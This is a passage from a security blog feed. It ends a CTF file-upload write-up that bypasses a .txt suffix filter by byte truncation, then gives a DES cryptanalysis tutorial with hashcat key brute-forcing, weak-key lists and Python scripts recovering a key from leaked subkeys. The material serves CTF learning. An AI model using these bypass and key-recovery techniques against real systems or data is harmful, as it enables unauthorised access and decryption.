src="/images/2018-11-04-16-45-39.png" alt=""><br>题目会帮你拼接一个.txt后缀<br>并且提示你要上传flag.php，<br>首先发现有2个变量可控<br><img src="/images/2018-11-04-16-46-19.png" alt=""><br>那么容易想到保存方式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploaddir+filename</span><br></pre></td></tr></table></figure></p><p>那么我们把php后缀拆开<br><img src="/images/2018-11-04-16-46-56.png" alt=""><br>接下来就是如何截断<code>.txt</code>了<br>首先尝试00未果，随机爆破，在02时发现截断成功<br><img src="/images/2018-11-04-16-40-03.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Symmetric block ciphers Summary - DES &amp; AES</title>
    <link href="http://skysec.top/2018/10/29/Symmetric-block-ciphers-Summary-DES-AES/"/>
    <id>http://skysec.top/2018/10/29/Symmetric-block-ciphers-Summary-DES-AES/</id>
    <published>2018-10-29T14:26:04.000Z</published>
    <updated>2018-11-02T06:38:34.039Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知：https://xz.aliyun.com/t/3101</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要进行密码学宣讲，所以就稍微总结了一下对称分组密码，毕竟公钥密码（RSA）前面总结过一些常见的了，这里给上链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">skysec.top/2018/08/24/RSA之拒绝套路(1)</span><br><span class="line">skysec.top/2018/08/25/RSA之拒绝套路(2)</span><br><span class="line">skysec.top/2018/09/13/Crypto-RSA多等式攻击总结</span><br><span class="line">skysec.top/2018/09/15/浅析RSA-Padding-Attack</span><br><span class="line">skysec.top/2018/09/17/Crypto-RSA-公钥攻击小结</span><br></pre></td></tr></table></figure></p><p>有兴趣的可以自己看看，无非是从公钥、多同余式、p/q或是公式推导入手。<br>而这里介绍的对称分组密码（DES、AES），主要从其本身和分组模式的问题介绍</p><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>DES由于密钥只有64bit，并且有效位只有仅仅56bit，剩余8bit为校验位，所以存在比较显著的爆破攻击风险</p><h3 id="爆破攻击"><a href="#爆破攻击" class="headerlink" title="爆破攻击"></a>爆破攻击</h3><p>以最新的hitcon2018为例：oh-my-raddit<br>这道题就可以作为一个爆破攻击的典例：<br>1.题目给了大量的密文<br>2.每个密文对应一篇文章的link<br>虽然本题乍一看是一道唯密文攻击的题目，但是不难提取出如下特点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1=6540f0e9c6cf744d42db7d895ec887fddbe85217dba80ef15a370279d62741526126bef1904e34a9754531903e10c8cce11b58e11007a26a55ba2433615b18871ffcfab2df695eb93ca92540eb2d0a42c2=71b09e88f72ba8da76e357af02ad9eab1433743fe85e31a2501049e465bca5e92faefdcb3f7dee61ca73fdc9bc3e4913ab5c2badf4c89831efa48ec2c7fb9d7bb488b51c02b43f9c7f006f8cb3b607a893cdc66682fcb18fc9708af28e08eddfa24dac555b4564836bf984a7b842cee2a58346067fff581424db8959accbdd893ca92540eb2d0a42c3=02f7e5385d69c591728fb03634bffc6894db69c649886bb48b2a80152681b5b7ead5bb13c0a0aed1a415ab01344a59c039790c9d9e7f8e303e88184ca4649bd719b04ad9b75ad670d4cfd0a444e4da7f3ca92540eb2d0a42</span><br></pre></td></tr></table></figure></p><p>我们看一下长度<br><img src="/images/2018-10-29-22-39-19.png" alt=""><br><img src="/images/2018-10-29-22-39-34.png" alt=""><br>不难发现：<br>1.每组密文的长度都是16的倍数，可以据此猜出大概为8bytes一组<br>2.每组密文结尾都是<code>3ca92540eb2d0a42</code>，不难猜出这应该是Padding<br>3.得到一组明密文对：<code>0808080808080808:3ca92540eb2d0a42</code><br>那么爆破即可，如果强行写脚本爆破，肯定是非常慢的。<br>这里可以使用工具<code>hashcat</code><br><img src="/images/2018-10-30-08-47-22.png" alt=""><br>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m 14000</span><br></pre></td></tr></table></figure></p><p>意思为<br><img src="/images/2018-10-30-08-48-49.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-a 3</span><br></pre></td></tr></table></figure></p><p>意思为<br><img src="/images/2018-10-30-08-52-31.png" alt=""><br><img src="/images/2018-10-30-08-52-04.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure></p><p>意思为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字?d</span><br><span class="line">小写字母?l</span><br><span class="line">大写字母?u</span><br><span class="line">特殊字符?s</span><br><span class="line">大小写字母+特殊字符?a</span><br></pre></td></tr></table></figure></p><p>这里意思为纯小写字母的key爆破</p><h3 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h3><p>之所以叫弱密钥，是因为使用这样的初始密钥会生成16个相同的子密钥，这肯定不是我们期望发生的<br>这样的弱密钥有</p><ul><li>0x0101010101010101</li><li>0xFEFEFEFEFEFEFEFE</li><li>0xE0E0E0E0F1F1F1F1</li><li>0x1F1F1F1F0E0E0E0E<br>同时还有半弱密钥，即存在情况<script type="math/tex; mode=display">E_{K_1}(E_{K_2}(M)) = M</script>即用K2加密明文，可以用K1解密，这种半弱密钥有：</li><li>0x011F011F010E010E:0x1F011F010E010E01</li><li>0x01E001E001F101F1:0xE001E001F101F101</li><li>0x01FE01FE01FE01FE:0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1:0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE:0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE:0xFEE0FEE0FEF1FEF1<br>参考链接：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES</span><br></pre></td></tr></table></figure></li></ul><h3 id="子密钥逆推"><a href="#子密钥逆推" class="headerlink" title="子密钥逆推"></a>子密钥逆推</h3><p>如果子密钥泄露，可以几乎成功逆推初始密钥，但由于有效位仅56bit，所以子密钥只能恢复56bit的子密钥，还有8bit需要爆破，但<code>2^8</code>并不是很大，所以可以容易破解<br>下面从一道某春秋的例题去看，考察点主要还是在密钥编排和DES流程分析<br>注：代码非常冗余，因为是1年前做的题，把脚本直接扒出来了</p><h4 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.......(代码省略)</span><br><span class="line">deskey=<span class="string">"imnotkey"</span></span><br><span class="line">DES = des(deskey)</span><br><span class="line">DES.Kn =[</span><br><span class="line">........(子密钥省略)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">DES.setMode(ECB)</span><br><span class="line">correct=[</span><br><span class="line">......(密文省略)</span><br><span class="line">]</span><br><span class="line"><span class="comment">#DES.encrypt(code)==correct</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key= deskey+code</span><br><span class="line">cipher = Blowfish.new(key, Blowfish.MODE_ECB)</span><br><span class="line"><span class="keyword">print</span> cipher.decrypt(base64.b64decode(<span class="string">"fxd+VFDXF6lksUAwcB1CMco6fnKqrQcO5nxS/hv3FtN7ngETu95BkjDn/ar+KD+RbmTHximw03g="</span>))</span><br></pre></td></tr></table></figure><h4 id="主流程分析"><a href="#主流程分析" class="headerlink" title="主流程分析"></a>主流程分析</h4><p>我们首先来看一下代码主流程看了什么：</p><ul><li>设置了一个未知的deskey</li><li>然后用这个未知的deskey加密了code</li><li>然后用deskey+code作为key，调用blowfish密码，加密了flag<br>然后我们有</li><li>deskey的密钥编排后的子密钥</li><li>code加密后的密文correct</li><li>blowfish加密后的密文<br>所以思路还算清晰：</li><li>用deskey的子密钥反推deskey</li><li>用deskey的子密钥解密correct得到code</li><li>用得到的deskey和code作为密钥解密blowfish密文得到flag<br>然后我们容易知道DES的密钥编排过程为:</li><li>首先输入64bit密钥</li><li>将64bit密钥经过PC-1盒变成56bit</li><li>将56bit分为C0和D0，分别28bit</li><li>将C0，D0分别循环左移位，得到C1，D1</li><li>将C1，D1拼接，经过PC-2盒变成48bit子密钥key1</li><li>重复步骤4</li><li>生成16组子密钥<br>所以这里我有想法:</li><li>由子密钥key1经过逆PC-2盒推出C1，D1(得到48位已知和8位未知)</li><li>由C1，D1分别循环右移1位，得到C0，D0</li><li>由C0，D0经过逆PC-1盒得到deskey(已知48位，未知16位)</li><li>然后将deskey的16个未知量设置成a,b,c,d……</li><li>用带有未知参数的deskey生成16个子密钥</li><li>用16个带未知参数的子密钥和16个已知子密钥建立方程组</li><li>可以解出其中8个bit的未知量，剩余8个bit不重要，因为deskey实际加密只用了56位密钥</li><li>随机给剩下8bit赋值，作为一个deskey，解密correct</li><li>爆破剩余8bit的deskey变量，根据题目特性，应该会有一个可以是明文的字符串，即deskey</li><li>用deskey+code作为key解密blowfish密文，得到flag<h4 id="由子密钥反推deskey"><a href="#由子密钥反推deskey" class="headerlink" title="由子密钥反推deskey"></a>由子密钥反推deskey</h4>我们有子密钥<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DES.Kn =[</span><br><span class="line">........(子密钥省略)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><p>由子密钥key1开始逆推：<br>首先是逆PC-2盒：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key1 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">__pc2 = [</span><br><span class="line"><span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>,  <span class="number">0</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>,  <span class="number">5</span>, <span class="number">20</span>,  <span class="number">9</span>,</span><br><span class="line"><span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">25</span>,  <span class="number">7</span>,</span><br><span class="line"><span class="number">15</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line"><span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line"><span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line"><span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line">C1D1 = [<span class="string">'*'</span>]*<span class="number">56</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(key1)):</span><br><span class="line">    C1D1[__pc2[i]] = key1[i]</span><br><span class="line"><span class="keyword">print</span> C1D1</span><br></pre></td></tr></table></figure></p><p>可以得到C1D1的值为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'*'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">'*'</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">'*'</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">'*'</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">'*'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">'*'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">'*'</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'*'</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><p>然后我们循环右移动1位逆推出C0D0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C1:11010110*11001100*101*01*011</span><br><span class="line">D1:111111*11*1111*1000000010*01</span><br></pre></td></tr></table></figure></p><p>循环右移一位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C0:111010110*11001100*101*01*01</span><br><span class="line">D0:1111111*11*1111*1000000010*0</span><br></pre></td></tr></table></figure></p><p>然后可以逆PC-1盒得到deskey<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C0=<span class="string">'111010110*11001100*101*01*01'</span></span><br><span class="line">D0=<span class="string">'1111111*11*1111*1000000010*0'</span></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">         <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">         ]</span><br><span class="line">C0D0 = C0+D0</span><br><span class="line">res = [<span class="string">'*'</span>]*<span class="number">64</span></span><br><span class="line">deskey = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(__pc1)):</span><br><span class="line">    res[__pc1[i]] = C0D0[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    deskey += i</span><br><span class="line"><span class="keyword">print</span> deskey</span><br></pre></td></tr></table></figure></p><p>得到deskey<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11000***11**011*0010011*1001011*0111011*11*00*1*1*0*011*1001111*</span><br></pre></td></tr></table></figure></p><p>然后我们给每个未知量替换为变量a,b,c……<br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11000abc11de011f0010011g1001011h0111011i11j00k1L1m0n011o1001111p</span><br></pre></td></tr></table></figure></p><p>然后我们用这个带未知量的deskey生成16个子密钥:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zuoyiwei</span><span class="params">(str,num)</span>:</span></span><br><span class="line">    my = str[num:len(str)]</span><br><span class="line">    my = my+str[<span class="number">0</span>:num]</span><br><span class="line">    <span class="keyword">return</span> my</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_1</span><span class="params">(str)</span>:</span></span><br><span class="line">    key1_list = [<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key1_list:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_2</span><span class="params">(str)</span>:</span></span><br><span class="line">    key2_list = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key2_list:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span><span class="params">(str)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    key_change_res = key_change_1(str)</span><br><span class="line">    key_c = key_change_res[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d = key_change_res[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) <span class="keyword">or</span> (i==<span class="number">2</span>) <span class="keyword">or</span> (i==<span class="number">9</span>) <span class="keyword">or</span> (i==<span class="number">16</span>):</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">1</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">2</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">2</span>)</span><br><span class="line">        key_yiwei = key_c+key_d</span><br><span class="line">        key_res = key_change_2(key_yiwei)</span><br><span class="line">        key_list.append(key_res)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line">deskey = <span class="string">"11000abc11de011f0010011g1001011h0111011i11j00k1L1m0n011o1001111p"</span></span><br><span class="line"><span class="keyword">print</span> key_gen(deskey)</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[&apos;101110011111010100011001111100110010101110010111&apos;, &apos;1j0n111101d110001m001110101k011110100011be0a0111&apos;, </span><br><span class="line">&apos;00111010jm100d11111110001011011ae01001111100011b&apos;, &apos;1d0111000101110m00101nj1011111b010k00e1111000111&apos;, </span><br><span class="line">&apos;11j00011d01010110101110m01k1e1101110010b11001a11&apos;, &apos;0000110m1111111010n001d1011011101e110101a10010k1&apos;, </span><br><span class="line">&apos;n1d1001100111101m11j10101b101k10111101010110101a&apos;, &apos;111m1j00111001n011100001e11011a0110111110k10b010&apos;, </span><br><span class="line">&apos;10n111011011m00j0d1101100k00111e11011b01011110a0&apos;, &apos;101001100dm011101110101j1100ba01110111010111k100&apos;,</span><br><span class="line">&apos;1111101j01110m1d001n0100110010011b0k11101a111e00&apos;, &apos;1m001n0010011111j101100d11011001a1011110e0k11101&apos;, </span><br><span class="line">&apos;010j01ndm111001001111111b00110110101ka101011110e&apos;, &apos;1010n11111011101d10000m01001a0e1011110b1101k0101&apos;, </span><br><span class="line">&apos;01md1010011010111110nj11101b001k0a10101e10110101&apos;, &apos;00101111100mdj10n111010110110e110110a0k011010b11&apos;]</span><br></pre></td></tr></table></figure></p><p>和题目中的Kn比对:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[&apos;101110011111010100011001111100110010101110010111&apos;, &apos;110011110111100010001110101001111010001111000111&apos;,</span><br><span class="line"> &apos;001110101010011111111000101101101010011111000111&apos;, &apos;110111000101110000101011011111101000011111000111&apos;, </span><br><span class="line"> &apos;111000111010101101011100010111101110010111001011&apos;, &apos;000011001111111010000111011011101111010101001001&apos;,</span><br><span class="line"> &apos;011100110011110101111010111010101111010101101010&apos;, &apos;111011001110010011100001111011001101111100101010&apos;,</span><br><span class="line"> &apos;100111011011000101110110000011111101110101111000&apos;, &apos;101001100100111011101011110010011101110101110100&apos;,</span><br><span class="line"> &apos;111110110111001100100100110010011100111010111100&apos;, &apos;100010001001111111011001110110010101111010011101&apos;, </span><br><span class="line"> &apos;010101010111001001111111100110110101001010111101&apos;, &apos;101001111101110111000000100100110111101110100101&apos;, </span><br><span class="line"> &apos;010110100110101111100111101100100010101110110101&apos;, &apos;001011111000111001110101101101110110000011010111&apos;]</span><br></pre></td></tr></table></figure></p><p>我们容易得到8个变量的值，然后得到带有8个未知数的deskey<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;1100001&quot;+c+&quot;1111011&quot;+f+&quot;0010011&quot;+g+&quot;1001011&quot;+h+&quot;0111011&quot;+i+&quot;1110001&quot;+l+&quot;1000011&quot;+o+&quot;1001111&quot;+p</span><br></pre></td></tr></table></figure></p><p>然而这个deskey大家会发现怎么都不对，我们阅读题目中给的程序<br>发现他对deskey的处理：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))</span><br></pre></td></tr></table></figure></p><p>我们跟进这个__String_to_BitList()<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__String_to_BitList</span><span class="params">(self, data)</span>:</span></span><br><span class="line"><span class="string">"""Turn the string data, into a list of bits (1, 0)'s"""</span></span><br><span class="line"><span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">l = len(data) * <span class="number">8</span></span><br><span class="line">result = [<span class="number">0</span>] * l</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line"><span 